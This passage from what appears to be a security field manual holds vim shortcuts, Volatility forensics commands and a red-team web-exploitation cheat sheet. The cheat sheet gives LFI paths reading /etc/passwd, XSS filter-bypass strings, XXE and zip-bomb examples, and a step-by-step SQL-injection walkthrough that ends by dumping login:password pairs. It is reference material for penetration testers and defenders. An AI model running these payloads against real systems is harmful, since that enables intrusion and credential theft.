 move back one full screen 
Ctrl + f  
 move forward one full screen 
Ctrl + d  
 move forward 1/2 a screen 
Ctrl + u  
 move back 1/2 a screen 
INSERT MODE 
i         
 insert before the cursor 
I         
 insert at the beginning of the line 
a         
 insert (append) after the cursor 
A         
 insert (append) at end of the line 
o         
 append (open) new line below current line 
O         
 append (open) a new line above the current 
line 
ea        
 insert (append) at the end of the word 
Esc       
 exit insert mode 
EDITING 
r         
 replace a single character 
J         
 join line below to the current one 
cc        
 change (replace) entire line 
cw        
 change (replace) to the start of the next 
word 
ce        
 change (replace) to the end of the next 
word 
cb        
 change (replace) to the start of the 
previous word 
c0        
 change (replace) to the start of the line 
c$        
 change (replace) to the end of the line 
s         
 delete character and substitute text 
S         
 delete line and substitute text (same as 
cc) 
xp        
 transpose two letters (delete and paste) 
.         
 repeat last command 
u         
 undo 
Ctrl + r  
 redo 
MARKING TEXT 
316 
v         
 start visual mode 
V         
 start linewise visual mode 
o         
 move to other end of marked area 
O         
 move to other corner of block 
aw        
 mark a word 
ab        
 a block with () 
aB        
 a block with {} 
ib        
 inner block with () 
iB        
 inner block with {} 
Esc       
 exit visual mode 
Ctrl + v  
 start visual block mode 
VISUAL CMDS 
>        
 shift text right 
gt               
 move to tab  
:tabmove         
 move current tab to the th position 
(indexed from 0) 
:tabclose or :tabc       
 close the current tab and all its windows 
:tabonly or :tabo        
 close all tabs except for the current one 
:tabdo command           
 run the command on all tabs 
:tabdo q 
 run the command all tabs then close 
REFERENCE: 
https://github.com/hackjutsu/vim-cheatsheet 
318 
V
V 
VOLATILITY 
RED/BLUE TEAM 
FORENSICS 
WINDOWS/LINUX/MacOS 
Volatility is an open-source memory forensics framework for 
incident response and malware analysis. It is written in Python and 
supports Microsoft Windows, Mac OS X, and Linux. Releases are 
available in zip and tar archives, Python module installers, and 
standalone executables. 
COMMAND 
DESCRIPTION 
vol.py -f image--profile=profileplugin 
Sample command format 
vol.py -f mem.img timeliner --output-
file out.body--output=body --
profile=Win10x64 
Timeliner plugin parses 
time-stamped objects 
found inmemory images.  
vol.py –f mem.img imageinfo 
Display memory image 
metadata 
vol.py apihooks 
Find API/DLL function 
hooks 
vol.py autoruns -v 
Map ASEPs to running 
processes 
vol.py cmdscan 
Scan for 
COMMAND_HISTORY buffers 
vol.py consoles 
Scan for 
CONSOLE_INFORMATION 
output 
vol.py dlldump --dump-dir ./output –r 
Extract DLLs from 
specific processes 
vol.py dlllist –p ### 
List of loaded dlls by 
process by PID 
vol.py driverirp –r tcpip 
Identify I/O Request 
Packet (IRP) hooks 
vol.py dumpfiles-n -i -r \\.exe --dump-
dir=./ 
Extract FILE_OBJECTs 
from memory 
vol.py dumpregistry--dump-dir ./output 
Extract all available 
registry hives 
vol.py filescan 
Scan memory for 
FILE_OBJECT handles 
vol.py getsids –p ### 
Print process security 
identifiers by PID 
vol.py handles –p ### –t File,Key 
List of open handles 
for each process 
{Process, Thread, Key, 
Event, File, Mutant, 
Token, Port} 
vol.py hashdump 
Dump user NTLM and 
Lanman hashes 
319 
vol.py hivedump –o 0xe1a14b60 
Print all keys and 
subkeys in a hive. -o 
Offset of registry hive 
to dump (virtual 
offset) 
vol.py hivelist 
Find and list available 
registry hives 
vol.py hollowfind-D ./output_dir 
Detect process 
hollowing techniques 
vol.py idt 
Display Interrupt 
Descriptor Table 
vol.py imagecopy -f hiberfil.sys -O 
hiber.raw --profile=Win7SP1x64 
Convert alternate 
memory sources to raw 
vol.py imagecopy -f MEMORY.DMP -O 
crashdump.raw –-
profile=Win2016x64_14393 
Convert alternate 
memory sources to raw 
vol.py ldrmodules –p ### -v 
Detect unlinked DLLs 
vol.py malfind --dump-dir ./output_dir 
Find possible malicious 
injected code and dump 
sections 
vol.py memdump –-dump-dir ./output –p 
### 
Extract every memory 
section into onefile 
vol.py moddump --dump-dir ./output –r 
Extract kernel drivers 
vol.py modscan 
Scan memory for loaded, 
unloaded, and unlinked 
drivers 
vol.py netscan 
Scan for TCP 
connections and sockets 
vol.py printkey –
K“Microsoft\Windows\CurrentVersion\Run” 
Output a registry key, 
subkeys, and values 
vol.py procdump --dump-dir ./output –p 
### 
Dump process to 
executable sample 
vol.py pslist 
High level view of 
running processes 
vol.py pstree 
Display parent-process 
relationships 
vol.py psxview 
Find hidden processes 
using cross-view 
vol.py ssdt 
Hooks in System Service 
Descriptor Table 
vol.py svcscan-v 
Scan for Windows 
Service record 
structures 
vol.py userassist 
Find and parse 
userassist key values 
vol.pypsscan 
Scan memory for 
EPROCESS blocks 
REFERENCE: 
320 
https://www.volatilityfoundation.org/ 
https://github.com/volatilityfoundation/volatility/wiki/Command-Reference 
https://digital-forensics.sans.org/media/volatility-memory-forensics-cheat-
sheet.pdf 
W 
W
W 
WEB_Exploit 
RED TEAM 
ENUM/SQLI/XSS/XXE 
WEB 
Web Enumeration 
Dirsearch 
dirsearch -u example.com -e sh,txt,htm,php,cgi,html,pl,bak,old 
dirsearch -u example.com -e sh,txt,htm,php,cgi,html,pl,bak,old -w 
path/to/wordlist 
dirsearch -u https://example.com -e . 
dirb 
dirb http://target.com /path/to/wordlist 
dirb http://target.com /path/to/wordlist -
X .sh,.txt,.htm,.php,.cgi,.html,.pl,.bak,.old 
Gobuster 
gobuster -u https://target.com -w /usr/share/wordlists/dirb/big.txt 
LFI (Local File Inclusion) 
321 
Vulnerable parameter 
http:///index.php?parameter=value 
Ways to Check/Verify/Test 
http:///index.php?parameter=php://filter/convert.base64-
encode/resource=index 
http:///script.php?page=../../../../../../../../etc/passwd 
http:///script.php?page=../../../../../../../../boot.ini 
Search for a LFI Payloads: 
Payload All the Things 
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Fil
e%20Inclusion/Intruders 
Seclist LFI Intruder 
https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI 
XSS Reflected 
Simple XSS Tests 
">"> 
Bypass filter of tag script 
" onload="alert(String.fromCharCode(88,83,83)) 
" onload="alert('XSS') 
Persistent 
>document.body.innerHTML="HELLOWORLD!"; 
Download via XSS 
Search for XSS payloads: 
Payload All The Things 
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS
%20Injection 
322 
Seclist XSS 
https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/XSS 
XML VULNERABILITIES 
XML External Entities expansion / XXE 
XML External Entity attack is a type of attack against an 
application that parses XML input. This attack occurs when XML 
input containing a reference to an external entity is processed by 
a weakly configured XML parser. This attack may lead to the 
disclosure of confidential data, denial of service, server side 
request forgery, port scanning from the perspective of the machine 
where the parser is located, and other system impacts. 
  ]>&xxe; 
  ]>&xxe; 
]> 
&sp; 
 ]>&xxe; 
Other XXE payloads worth testing: 
XXE-Payloads 
https://gist.github.com/mgeeky/181c6836488e35fcbf70290a048cd51d 
Blind-XXE-Payload 
https://gist.github.com/mgeeky/cf677de6e7fdc05803f6935de1ee0882 
DTD Retrieval 
Some XML libraries like Python's xml.dom.pulldom retrieve document 
type definitions from remote or local locations. Several attack 
scenarios from the external entity case apply to this issue as 
well. 
323 
    text 
Decompression Bomb 
Decompression bombs (aka ZIP bomb) apply to all XML libraries that 
can parse compressed XML streams such as gzipped HTTP streams or 
LZMA-compressed files. For an attacker it can reduce the amount of 
transmitted data by three magnitudes or more. 
$ dd if=/dev/zero bs=1M count=1024 | gzip > zeros.gz 
$ dd if=/dev/zero bs=1M count=1024 | lzma -z > zeros.xy 
$ ls -sh zeros.* 
1020K zeros.gz 
148K zeros.xy 
XPath Injection 
XPath injection attacks pretty much work like SQL injection 
attacks. Arguments to XPath queries must be quoted and validated 
properly, especially when they are taken from the user. The page 
Avoid the dangers of XPath injection list some ramifications of 
XPath injections. 
XInclude 
XML Inclusion is another way to load and include external files: 
This feature should be disabled when XML files from an untrusted 
source are processed. Some Python XML libraries and libxml2 support 
XInclude but don't have an option to sandbox inclusion and limit it 
to allowed directories. 
XSL Transformation 
You should keep in mind that XSLT is a Turing complete language. 
Never process XSLT code from unknown or untrusted source! XSLT 
processors may allow you to interact with external resources in 
ways you can't even imagine. Some processors even support 
extensions that allow read/write access to file system, access to 
JRE objects or scripting with Jython. 
Example from Attacking XML Security for Xalan-J: 
Manual SQLInjection 
Simple test adding a simpe quote ' 
http:///Less-1/?id=5' 
Fuzzing sorting columns to find maximum column 
http:///Less-1/?id=-1 order by 1 
http:///Less-1/?id=-1 order by 2 
http:///Less-1/?id=-1 order by 3 
…until errors stop 
Finding what column is injectable 
MYSQL 
http:///Less-1/?id=-1 union select 1, 2, 3 
(using the same amount of columns you got on the previous step) 
POSTGRES 
http:///Less-1/?id=-1 union select NULL, NULL, NULL 
(using the same amount of columns you got on the previous step) 
One of the columns will be printed with the respective number 
Finding version 
MYSQL 
http:///Less-1/?id=-1 union select 1, 2, version() 
POSTGRES 
http:///Less-1/?id=-1 union select NULL, NULL, version() 
Finding database name 
MYSQL 
http:///Less-1/?id=-1 union select 1,2, database() 
postgres 
http:///Less-1/?id=-1 union select NULL,NULL, database() 
325 
Finding usernames logged in 
MYSQL 
http:///Less-1/?id=-1 union select 1, 2, current_user() 
Finding databases 
MYSQL 
http:///Less-1/?id=-1 union select 1, 2, schema_name from 
information_schema.schemata 
POSTGRES 
http:///Less-1/?id=-1 union select 1, 2, datname from 
pg_database 
Finding table names from a database 
MYSQL 
http:///Less-1/?id=-1 union select 1, 2, table_name from 
information_schema.tables where table_schema="database_name" 
POSTGRES 
http:///Less-1/?id=-1 union select 1, 2, tablename from 
pg_tables where table_catalog="database_name" 
Finding column names from a table 
MYSQL 
http:///Less-1/?id=-1 union select 1, 2, column_name from 
information_schema.columns where table_schema="database_name" and 
table_name="tablename" 
POSTGRES 
http:///Less-1/?id=-1 union select 1, 2, column_name from 
information_schema.columns where table_catalog="database_name" and 
table_name="tablename" 
Concatenate 
MYSQL 
http:///Less-1/?id=-1 union select 1, 2, 
concat(login,':',password) from users;  
POSTGRES 
http:///Less-1/?id=-1 union select 1, 2, login||':'||password 
from users;  
Error Based SQLI (USUALLY MS-SQL) 
Current user 
326 
http:///Less-1/?id=-1 or 1 in (SELECT TOP 1 CAST(user_name() as 
varchar(4096)))-- 
DBMS version 
http:///Less-1/?id=-1 or 1 in (SELECT TOP 1 CAST(@@version as 
varchar(4096)))-- 
Database name 
http:///Less-1/?id=-1 or db_name(0)=0 -- 
Tables from a database 
http:///Less-1/?id=-1 or 1 in (SELECT TOP 1 CAST(name as 
varchar(4096)) FROM dbname..sysobjects where xtype='U')-- 
http:///Less-1/?id=-1 or 1 in (SELECT TOP 1 CAST(name as 
varchar(4096)) FROM dbname..sysobjects where xtype='U' AND name NOT 
IN ('previouslyFoundTable',...))-- 
Columns within a table 
http:///Less-1/?id=-1 or 1 in (SELECT TOP 1 
CAST(dbname..syscolumns.name as varchar(4096)) FROM 
dbname..syscolumns, dbname..sysobjects WHERE 
dbname..syscolumns.id=dbname..sysobjects.id AND 
dbname..sysobjects.name = 'tablename')-- 
**Remember to change dbname and tablename accordingly with the 
given situation after each iteration a new column name will be 
found, make sure add it to ** previously found column name ** 
separated by comma as on the next sample 
http:///Less-1/?id=-1 or 1 in (SELECT TOP 1 
CAST(dbname..syscolumns.name as varchar(4096)) FROM 
dbname..syscolumns, dbname..sysobjects WHERE 
dbname..syscolumns.id=dbname..sysobjects.id AND 
dbname..sysobjects.name = 'tablename' AND dbname..syscolumns.name 
NOT IN('previously found column name', ...))-- 
Actual data 
http:///Less-1/?id=-1 or 1 in (SELECT TOP 1 CAST(columnName as 